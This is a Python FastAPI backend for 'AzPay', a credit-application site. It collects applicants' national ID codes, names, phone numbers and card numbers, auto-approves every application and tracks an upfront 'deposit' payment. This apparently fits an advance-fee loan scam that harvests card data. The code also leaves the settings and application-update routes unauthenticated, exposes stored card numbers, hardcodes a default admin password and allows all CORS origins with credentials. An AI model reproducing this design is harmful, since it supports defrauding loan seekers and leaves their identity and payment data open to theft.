from fastapi import FastAPI, APIRouter, HTTPException, Header, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional
import uuid
from datetime import datetime, timezone


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Admin password from env
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Batuhan6565')

# Define Models
class CreditApplication(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    fin_code: str
    id_series: str
    full_name: str
    phone: str
    selected_amount: Optional[int] = None
    card_number: Optional[str] = None
    contract_signed: bool = False
    deposit_paid: bool = False
    status: str = "pending"  # pending, approved, completed
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class CreditApplicationCreate(BaseModel):
    fin_code: str
    id_series: str
    full_name: str
    phone: str

class CreditApplicationUpdate(BaseModel):
    selected_amount: Optional[int] = None
    card_number: Optional[str] = None
    contract_signed: Optional[bool] = None
    deposit_paid: Optional[bool] = None
    status: Optional[str] = None

class CreditOffer(BaseModel):
    amount: int
    duration_months: int
    interest_rate: float
    monthly_payment: float

class Settings(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = "settings"
    deposit_amount: float = 50.0
    whatsapp_link: str = "https://wa.me/994501234567"
    whatsapp_message_enabled: bool = True
    
    # Site Images
    logo_url: str = "https://i.hizliresim.com/iydskgy.jpeg"
    hero_image_url: str = "https://i.hizliresim.com/iydskgy.jpeg"
    approval_image_url: str = "https://i.hizliresim.com/iydskgy.jpeg"
    credit_selection_image_url: str = "https://i.hizliresim.com/iydskgy.jpeg"
    card_entry_image_url: str = "https://i.hizliresim.com/iydskgy.jpeg"
    contract_image_url: str = "https://i.hizliresim.com/iydskgy.jpeg"
    
    # Contact Info
    contact_phone: str = "+994 50 123 45 67"
    contact_email: str = "info@azpay.az"
    contact_address: str = "Bakı, Azərbaycan"
    about_text: str = "AzPay - Azərbaycanda rəqəmsal maliyyə xidmətləri sahəsində fəaliyyət göstərən innovativ şirkətdir."
    updated_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class SettingsUpdate(BaseModel):
    deposit_amount: Optional[float] = None
    whatsapp_link: Optional[str] = None
    whatsapp_message_enabled: Optional[bool] = None
    
    # Site Images
    logo_url: Optional[str] = None
    hero_image_url: Optional[str] = None
    approval_image_url: Optional[str] = None
    credit_selection_image_url: Optional[str] = None
    card_entry_image_url: Optional[str] = None
    contract_image_url: Optional[str] = None
    
    # Contact Info
    contact_phone: Optional[str] = None
    contact_email: Optional[str] = None
    contact_address: Optional[str] = None
    about_text: Optional[str] = None

# Routes
@api_router.get("/")
async def root():
    return {"message": "AzPay Kredit Sistemi API"}

@api_router.get("/admin/security-logs")
async def get_security_logs(
    security_password: str = Header(...),
    limit: int = 100
):
    """
    Get security logs - requires special security password
    Password is stored securely in .env file
    """
    SECURITY_PASSWORD = os.environ.get('SECURITY_LOG_PASSWORD')
    
    if security_password != SECURITY_PASSWORD:
        raise HTTPException(status_code=403, detail="Yanlış təhlükəsizlik şifrəsi")
    
    from security_log import get_security_logs, get_unique_ips
    
    logs = get_security_logs(limit=limit)
    unique_ips = get_unique_ips()
    
    return {
        "logs": logs,
        "total": len(logs),
        "unique_ips": unique_ips,
        "unique_ip_count": len(unique_ips)
    }

@api_router.post("/admin/log-login")
async def log_admin_login(
    request: Request,
    admin_password: str = Header(None, alias="admin-password"),
    user_agent: str = Header(None, alias="user-agent")
):
    """
    Log admin login attempts (both successful and failed)
    Login code is stored securely in .env file
    """
    from security_log import log_admin_activity
    
    # Get real IP address
    forwarded_for = request.headers.get('x-forwarded-for')
    if forwarded_for:
        ip_address = forwarded_for.split(',')[0].strip()
    else:
        ip_address = request.client.host if request.client else "Unknown"
    
    # Admin login code from .env - not hardcoded
    ADMIN_LOGIN_CODE = os.environ.get('ADMIN_LOGIN_CODE')
    success = admin_password == ADMIN_LOGIN_CODE
    
    # Log the login attempt
    action = "LOGIN_SUCCESS" if success else "LOGIN_FAILED"
    details = {
        "attempt_type": "admin_panel_login",
        "login_method": "secure_code"
    }
    
    log_admin_activity(
        ip_address=ip_address,
        action=action,
        details=details,
        user_agent=user_agent
    )
    
    if not success:
        raise HTTPException(status_code=401, detail="Yanlış kod")
    
    return {"success": True, "message": "Giriş uğurlu oldu"}

# 2FA Verification Endpoints - All codes stored in .env
@api_router.post("/admin/verify-2fa-step1")
async def verify_2fa_step1(data: dict):
    """
    Verify first security code for 2FA
    Code is stored securely in .env file
    """
    SECURITY_CODE_1 = os.environ.get('SECURITY_CODE_1')
    
    if not data.get('code') or data.get('code') != SECURITY_CODE_1:
        raise HTTPException(status_code=401, detail="Yanlış təhlükəsizlik kodu")
    
    return {"success": True, "message": "Birinci kod təsdiqləndi"}

@api_router.post("/admin/verify-2fa-step2")
async def verify_2fa_step2(data: dict):
    """
    Verify second 2FA code
    Code is stored securely in .env file
    """
    SECURITY_CODE_2 = os.environ.get('SECURITY_CODE_2')
    
    if not data.get('code') or data.get('code').upper() != SECURITY_CODE_2:
        raise HTTPException(status_code=401, detail="Yanlış 2FA kodu")
    
    return {"success": True, "message": "2FA təsdiqləndi"}

# Credit Application Routes
@api_router.post("/applications", response_model=CreditApplication)
async def create_application(input: CreditApplicationCreate):
    app_dict = input.model_dump()
    app_obj = CreditApplication(**app_dict)
    app_obj.status = "approved"  # Auto-approve for demo
    
    doc = app_obj.model_dump()
    doc['created_at'] = doc['created_at'].isoformat()
    
    await db.applications.insert_one(doc)
    return app_obj

@api_router.get("/applications/{app_id}", response_model=CreditApplication)
async def get_application(app_id: str):
    app = await db.applications.find_one({"id": app_id}, {"_id": 0})
    if not app:
        raise HTTPException(status_code=404, detail="Müraciət tapılmadı")
    
    if isinstance(app.get('created_at'), str):
        app['created_at'] = datetime.fromisoformat(app['created_at'])
    
    return app

@api_router.put("/applications/{app_id}", response_model=CreditApplication)
async def update_application(app_id: str, update: CreditApplicationUpdate):
    app = await db.applications.find_one({"id": app_id}, {"_id": 0})
    if not app:
        raise HTTPException(status_code=404, detail="Müraciət tapılmadı")
    
    update_data = {k: v for k, v in update.model_dump().items() if v is not None}
    
    if update_data:
        await db.applications.update_one(
            {"id": app_id},
            {"$set": update_data}
        )
    
    updated_app = await db.applications.find_one({"id": app_id}, {"_id": 0})
    if isinstance(updated_app.get('created_at'), str):
        updated_app['created_at'] = datetime.fromisoformat(updated_app['created_at'])
    
    return updated_app

# Credit Offers
@api_router.get("/credit-offers", response_model=List[CreditOffer])
async def get_credit_offers():
    # Pre-defined credit offers with 10% interest rate
    offers = [
        # 24 aylıq (1-4 min) - 10% faiz
        CreditOffer(amount=1000, duration_months=24, interest_rate=10.0, monthly_payment=46.1),
        CreditOffer(amount=2000, duration_months=24, interest_rate=10.0, monthly_payment=92.3),
        CreditOffer(amount=3000, duration_months=24, interest_rate=10.0, monthly_payment=138.5),
        CreditOffer(amount=4000, duration_months=24, interest_rate=10.0, monthly_payment=184.6),
        # 36 aylıq (5-9 min) - 10% faiz
        CreditOffer(amount=5000, duration_months=36, interest_rate=10.0, monthly_payment=161.5),
        CreditOffer(amount=6000, duration_months=36, interest_rate=10.0, monthly_payment=193.8),
        CreditOffer(amount=7000, duration_months=36, interest_rate=10.0, monthly_payment=226.1),
        CreditOffer(amount=8000, duration_months=36, interest_rate=10.0, monthly_payment=258.4),
        CreditOffer(amount=9000, duration_months=36, interest_rate=10.0, monthly_payment=290.7),
        # 48 aylıq (10-15 min) - 10% faiz
        CreditOffer(amount=10000, duration_months=48, interest_rate=10.0, monthly_payment=254.0),
        CreditOffer(amount=11000, duration_months=48, interest_rate=10.0, monthly_payment=279.4),
        CreditOffer(amount=12000, duration_months=48, interest_rate=10.0, monthly_payment=304.8),
        CreditOffer(amount=13000, duration_months=48, interest_rate=10.0, monthly_payment=330.2),
        CreditOffer(amount=14000, duration_months=48, interest_rate=10.0, monthly_payment=355.6),
        CreditOffer(amount=15000, duration_months=48, interest_rate=10.0, monthly_payment=381.0),
    ]
    return offers

# Settings Routes
@api_router.get("/settings", response_model=Settings)
async def get_settings():
    settings = await db.settings.find_one({"id": "settings"}, {"_id": 0})
    
    if not settings:
        # Create default settings
        default_settings = Settings()
        doc = default_settings.model_dump()
        doc['updated_at'] = doc['updated_at'].isoformat()
        await db.settings.insert_one(doc)
        return default_settings
    
    if isinstance(settings.get('updated_at'), str):
        settings['updated_at'] = datetime.fromisoformat(settings['updated_at'])
    
    return settings

@api_router.put("/settings", response_model=Settings)
async def update_settings(
    update: SettingsUpdate, 
    request: Request = None,
    user_agent: str = Header(None)
):
    """
    Update settings - 2FA verification is done before this endpoint is called
    No password required here as frontend handles 2FA first
    """
    from security_log import log_admin_activity
    
    # Get real client IP (extract from headers)
    def get_real_ip(request):
        # Try X-Forwarded-For first (comma-separated list, first is real client)
        forwarded = request.headers.get("x-forwarded-for")
        if forwarded:
            # Get first IP (real client IP)
            return forwarded.split(',')[0].strip()
        
        # Try X-Real-IP
        real_ip = request.headers.get("x-real-ip")
        if real_ip:
            return real_ip.strip()
        
        # Fallback to direct connection IP
        return request.client.host if request and request.client else "unknown"
    
    client_ip = get_real_ip(request)
    
    # Get current settings to compare
    current_settings = await db.settings.find_one({"id": "settings"}, {"_id": 0})
    
    if not current_settings:
        current_settings = Settings().model_dump()
    
    # Find actually changed fields (compare with current values)
    changed_fields = []
    update_dict = update.model_dump(exclude_unset=True)
    for field_name, new_value in update_dict.items():
        if new_value is not None:
            current_value = current_settings.get(field_name)
            # Compare values (handle type differences)
            if str(current_value) != str(new_value):
                changed_fields.append(field_name)
    
    # Only log if something actually changed
    if changed_fields:
        log_admin_activity(
            ip_address=client_ip,
            action="UPDATE_SETTINGS",
            user_agent=user_agent,
            details={"fields_updated": changed_fields}
        )
    
    settings = current_settings
    
    if not settings:
        settings = Settings().model_dump()
        settings['updated_at'] = settings['updated_at'].isoformat()
        await db.settings.insert_one(settings)
        settings = await db.settings.find_one({"id": "settings"}, {"_id": 0})
    
    update_data = {k: v for k, v in update.model_dump().items() if v is not None}
    update_data['updated_at'] = datetime.now(timezone.utc).isoformat()
    
    if update_data:
        await db.settings.update_one(
            {"id": "settings"},
            {"$set": update_data}
        )
    
    updated_settings = await db.settings.find_one({"id": "settings"}, {"_id": 0})
    if isinstance(updated_settings.get('updated_at'), str):
        updated_settings['updated_at'] = datetime.fromisoformat(updated_settings['updated_at'])
    
    return updated_settings

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()